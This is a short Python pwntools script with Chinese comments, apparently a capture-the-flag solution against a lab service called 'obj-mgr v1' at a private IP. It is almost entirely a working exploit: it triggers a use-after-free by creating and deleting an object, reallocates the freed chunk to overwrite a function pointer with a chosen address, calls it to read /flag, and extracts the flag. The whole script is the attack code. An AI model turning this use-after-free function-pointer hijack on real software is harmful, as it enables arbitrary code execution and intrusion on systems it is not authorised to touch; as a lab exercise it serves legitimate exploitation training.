#!/usr/bin/env python3
# obj-mgr v1 利用：
#   create 0        -> func_heap[0] = chunk, chunk[0] = default_func
#   delete 0        -> free(chunk)，但 func_heap[0] 仍指向它（悬垂指针）
#   alloc_data 0 X  -> malloc(8) 复用同一 chunk，把 X 写进 chunk[0]（即函数指针）
#   use 0           -> call *(func_heap[0]) -> X -> 读 /flag
from pwn import *
import re

context.log_level = "error"

HOST = "172.17.0.13"   # TODO: 靶机 IP
PORT = 12777          # TODO: 靶机端口
TARGET = 0x4012BA    # TODO: 读 /flag 的代码地址（跳转目标）

io = remote(HOST, PORT)
io.recvuntil(b"quit", timeout=5)   # 吃掉 banner


def step(desc, line):
    """发一条命令并回显靶机响应"""
    io.sendline(line.encode())
    out = io.recvline(timeout=3).decode(errors="replace").rstrip()
    print("[%s] %-22s -> %s" % (desc, line, out))
    return out


step("1/4 create   ", "create 0")                   # 建对象，先让 is_exist[0]=1
step("2/4 delete   ", "delete 0")                   # 只 free，不置 is_exist、不清 func_heap[0]
step("3/4 alloc_data", "alloc_data 0 %x" % TARGET)  # 复用同一 chunk，覆写函数指针
flag_out = step("4/4 use      ", "use 0")           # call 到 TARGET，输出 flag

out = flag_out + io.recvall(timeout=5).decode(errors="replace")
m = re.search(r"vmc\{[^}]*\}", out)
print()
if m:
    print("[+] FLAG: %s" % m.group(0))
else:
    print("[-] 没抓到 flag。检查点：0x4012BA 是否可直接 jmp 进去（是否依赖上文 rdi=.. ），"
          "以及 call 时栈是否 16 字节对齐（对不上就在 TARGET 上 ±1 试）。")
    print("[-] 原始回显: %r" % out)
